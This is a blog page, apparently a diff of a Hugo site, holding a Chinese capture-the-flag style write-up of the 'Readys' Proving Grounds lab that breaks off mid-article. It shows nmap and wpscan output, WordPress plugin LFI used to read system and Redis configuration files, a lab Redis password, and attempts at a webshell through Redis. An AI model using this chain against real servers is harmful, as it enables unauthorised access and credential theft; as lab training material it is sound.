@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" Difficulty: Linux Community Rate: Very Hard OS: Windows Nmap result PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-generator: WordPress 5.7.2 |_http-title: Readys &#8211; Just another WordPress site 6379/tcp open redis syn-ack ttl 61 Redis key-value store Initial Foothold 80 HTTP 类似于一个个人博客，大标题上有说用了wordpress\n">
+<title>OSCP-PGP Readys Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/oscp-pgp-readys-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="OSCP-PGP Readys Writeup">
+<meta property='og:description' content=" Difficulty: Linux Community Rate: Very Hard OS: Windows Nmap result PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-generator: WordPress 5.7.2 |_http-title: Readys &#8211; Just another WordPress site 6379/tcp open redis syn-ack ttl 61 Redis key-value store Initial Foothold 80 HTTP 类似于一个个人博客，大标题上有说用了wordpress\n">
+<meta property='og:url' content='http://localhost:1313/oscp-pgp-readys-writeup/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-05-28T08:43:08&#43;00:00'/><meta property='article:modified_time' content='2025-05-28T08:43:08&#43;00:00'/><meta property='og:image' content='http://localhost:1313/legacy/uploads/2025/03/1743336789-gura-150x150.jpg' />
+<meta name="twitter:title" content="OSCP-PGP Readys Writeup">
+<meta name="twitter:description" content=" Difficulty: Linux Community Rate: Very Hard OS: Windows Nmap result PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-generator: WordPress 5.7.2 |_http-title: Readys &#8211; Just another WordPress site 6379/tcp open redis syn-ack ttl 61 Redis key-value store Initial Foothold 80 HTTP 类似于一个个人博客，大标题上有说用了wordpress\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/legacy/uploads/2025/03/1743336789-gura-150x150.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#nmap-result">Nmap result</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#我学到了什么">我学到了什么</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/oscp-pgp-readys-writeup/">
+                
+                    <img src="/legacy/uploads/2025/03/1743336789-gura-150x150.jpg" loading="lazy" alt="Featured image of post OSCP-PGP Readys Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/oscp-pgp/" >
+                OSCP-PGP Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/oscp-pgp-readys-writeup/">OSCP-PGP Readys Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">May 28, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/oscp-pgp-readys-writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <ul class="wp-block-list">
+  <li>
+    Difficulty: Linux
+  </li>
+  <li>
+    Community Rate: Very Hard
+  </li>
+  <li>
+    OS: Windows
+  </li>
+</ul>
+<h2 id="nmap-result">Nmap result
+</h2><div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+PORT     STATE SERVICE REASON         VERSION
+22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
+|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
+80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: WordPress 5.7.2
+|_http-title: Readys &#8211; Just another WordPress site
+6379/tcp open  redis   syn-ack ttl 61 Redis key-value store
+</pre>
+</div>
+<h2 id="initial-foothold">Initial Foothold
+</h2><p>80 HTTP 类似于一个个人博客，大标题上有说用了wordpress<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="542" src="../legacy/uploads/2025/05/1748417544-image-1024x542.png" alt="" class="wp-image-1424" srcset="../legacy/uploads/2025/05/1748417544-image-1024x542.png 1024w, ../legacy/uploads/2025/05/1748417544-image-300x159.png 300w, ../legacy/uploads/2025/05/1748417544-image-768x406.png 768w, ../legacy/uploads/2025/05/1748417544-image.png 1522w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>直接用wpsscan扫描一下：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+wpscan --url http://192.168.201.166/ -e vp --plugins-detection mixed --api-token token
+</pre>
+</div><figure class="wp-block-image size-full">
+<p><img loading="lazy" decoding="async" width="945" height="535" src="../legacy/uploads/2025/05/1748418293-image.png" alt="" class="wp-image-1428" srcset="../legacy/uploads/2025/05/1748418293-image.png 945w, ../legacy/uploads/2025/05/1748418293-image-300x170.png 300w, ../legacy/uploads/2025/05/1748418293-image-768x435.png 768w" sizes="auto, (max-width: 945px) 100vw, 945px" /> </figure></p>
+<p>扫描出来Site Editor这个插件有LFI漏洞，搜索一下CVE-2018-7422，在<a href="https://www.exploit-db.com/exploits/44340" target="_blank"  rel="nofollow" >ExploitDatabase</a>找到相应POC。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="62" src="../legacy/uploads/2025/05/1748418395-image-1024x62.png" alt="" class="wp-image-1430" srcset="../legacy/uploads/2025/05/1748418395-image-1024x62.png 1024w, ../legacy/uploads/2025/05/1748418395-image-300x18.png 300w, ../legacy/uploads/2025/05/1748418395-image-768x46.png 768w, ../legacy/uploads/2025/05/1748418395-image-1536x93.png 1536w, ../legacy/uploads/2025/05/1748418395-image.png 1654w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>尝试访问这个URI：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="183" src="../legacy/uploads/2025/05/1748418432-image-1024x183.png" alt="" class="wp-image-1431" srcset="../legacy/uploads/2025/05/1748418432-image-1024x183.png 1024w, ../legacy/uploads/2025/05/1748418432-image-300x54.png 300w, ../legacy/uploads/2025/05/1748418432-image-768x137.png 768w, ../legacy/uploads/2025/05/1748418432-image-1536x275.png 1536w, ../legacy/uploads/2025/05/1748418432-image.png 1923w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>漏洞存在。获得用户名alice，因为22 ssh端口开放，尝试下能否获得用户的id_rsa. <figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="147" src="../legacy/uploads/2025/05/1748418489-image-1024x147.png" alt="" class="wp-image-1432" srcset="../legacy/uploads/2025/05/1748418489-image-1024x147.png 1024w, ../legacy/uploads/2025/05/1748418489-image-300x43.png 300w, ../legacy/uploads/2025/05/1748418489-image-768x110.png 768w, ../legacy/uploads/2025/05/1748418489-image.png 1289w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>可惜找不到文件. 再尝试下.bash_history是否存在:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="153" src="../legacy/uploads/2025/05/1748418539-image-1024x153.png" alt="" class="wp-image-1433" srcset="../legacy/uploads/2025/05/1748418539-image-1024x153.png 1024w, ../legacy/uploads/2025/05/1748418539-image-300x45.png 300w, ../legacy/uploads/2025/05/1748418539-image-768x114.png 768w, ../legacy/uploads/2025/05/1748418539-image.png 1248w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>也没有，但可以直接获得local.txt<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="781" height="200" src="../legacy/uploads/2025/05/1748418565-image.png" alt="" class="wp-image-1434" srcset="../legacy/uploads/2025/05/1748418565-image.png 781w, ../legacy/uploads/2025/05/1748418565-image-300x77.png 300w, ../legacy/uploads/2025/05/1748418565-image-768x197.png 768w" sizes="auto, (max-width: 781px) 100vw, 781px" /> </figure></p>
+<p>尝试找一下webroot：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="287" src="../legacy/uploads/2025/05/1748418799-image-1024x287.png" alt="" class="wp-image-1436" srcset="../legacy/uploads/2025/05/1748418799-image-1024x287.png 1024w, ../legacy/uploads/2025/05/1748418799-image-300x84.png 300w, ../legacy/uploads/2025/05/1748418799-image-768x215.png 768w, ../legacy/uploads/2025/05/1748418799-image.png 1290w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>应该就是在/var/www/html/ 这下面 如文件不存在则会返回Not Found.</p>
+<p>暂且搁置80, 看看其他的端口。6379端口显示是redis服务器：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="537" height="31" src="../legacy/uploads/2025/05/1748418878-image.png" alt="" class="wp-image-1439" srcset="../legacy/uploads/2025/05/1748418878-image.png 537w, ../legacy/uploads/2025/05/1748418878-image-300x17.png 300w" sizes="auto, (max-width: 537px) 100vw, 537px" /> </figure></p>
+<p>google一下是什么：</p>
+<p><em>Redis（Remote Dictionary Server）是一个开源的内存数据结构存储系统，主要用于缓存、消息队列和高性能键值数据库场景。</em></p>
+<p>在<a href="https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce" target="_blank"  rel="nofollow" >Hacktricks</a>里能找到渗透redis的方法. 先安装对应的工具, 并尝试连接:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+sudo apt-get install redis-tools
+redis-cli -h 192.168.201.166
+192.168.201.166:6379&gt;info
+NOAUTH Authentication required.
+</pre>
+</div>
+<p>服务器开启了验证, 需要先拿到credential. Hacktricks里也提到了redis.conf文件里可能会包含验证所需的密码。在网上找了一圈redis.conf location后在/etc/redis/redis.conf找到这个文件:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="366" src="../legacy/uploads/2025/05/1748419718-image-1024x366.png" alt="" class="wp-image-1444" srcset="../legacy/uploads/2025/05/1748419718-image-1024x366.png 1024w, ../legacy/uploads/2025/05/1748419718-image-300x107.png 300w, ../legacy/uploads/2025/05/1748419718-image-768x274.png 768w, ../legacy/uploads/2025/05/1748419718-image.png 1518w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure> <figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="325" height="99" src="../legacy/uploads/2025/05/1748419724-image.png" alt="" class="wp-image-1445" srcset="../legacy/uploads/2025/05/1748419724-image.png 325w, ../legacy/uploads/2025/05/1748419724-image-300x91.png 300w" sizes="auto, (max-width: 325px) 100vw, 325px" /></figure></p>
+<p>在文中找到密码 Ready4Redis? 尝试验证：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="744" height="301" src="../legacy/uploads/2025/05/1748419773-image.png" alt="" class="wp-image-1446" srcset="../legacy/uploads/2025/05/1748419773-image.png 744w, ../legacy/uploads/2025/05/1748419773-image-300x121.png 300w" sizes="auto, (max-width: 744px) 100vw, 744px" /> </figure></p>
+<p>验证成功.</p>
+<p>Hacktricks中也提到，可以利用redis-cli在服务器上创建文件 可以尝试上传一个webshell<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="434" src="../legacy/uploads/2025/05/1748419885-image-1024x434.png" alt="" class="wp-image-1447" srcset="../legacy/uploads/2025/05/1748419885-image-1024x434.png 1024w, ../legacy/uploads/2025/05/1748419885-image-300x127.png 300w, ../legacy/uploads/2025/05/1748419885-image-768x325.png 768w, ../legacy/uploads/2025/05/1748419885-image.png 1220w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>尝试了很多位置，都以error结束。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="743" height="301" src="../legacy/uploads/2025/05/1748420056-image.png" alt="" class="wp-image-1448" srcset="../legacy/uploads/2025/05/1748420056-image.png 743w, ../legacy/uploads/2025/05/1748420056-image-300x122.png 300w" sizes="auto, (max-width: 743px) 100vw, 743px" /> </figure></p>
+<p>然后又尝试了hacktricks里提到的: <a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank"  rel="nofollow" >radis-rogue-server</a> 但这个项目是好多年前的了，用了几个类似的exploit全都不管用. 卡在这里了很久, 看了别人的writeup都可以运行, 我这边无论如何都不能跑. 无奈去看了官方的Writeup, 受益匪浅.</p>
+<p>官方Writeup则是先利用LFI查看/etc/systemd/system/redis.service中的信息. 这个文件中包含了服务的各种配置，例如哪里可读，哪里可写：<figure class="wp-block-image size-large"></p>
